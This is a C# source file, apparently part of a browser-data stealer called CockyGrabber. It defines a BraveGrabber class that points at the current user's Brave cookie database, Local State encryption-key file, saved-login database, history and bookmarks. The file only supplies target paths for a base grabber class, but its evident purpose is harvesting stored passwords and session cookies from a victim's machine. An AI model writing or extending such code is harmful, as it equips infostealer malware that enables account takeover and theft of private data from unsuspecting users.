using System;

namespace CockyGrabber.Grabbers
{
    public class BraveGrabber : BlinkGrabber
    {
        public override string CookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies";
            }
        }
        public override string LocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
            }
        }
        public override string HistoryPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History";
            }
        }
        public override string BookmarkPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks";
            }
        }
    }
}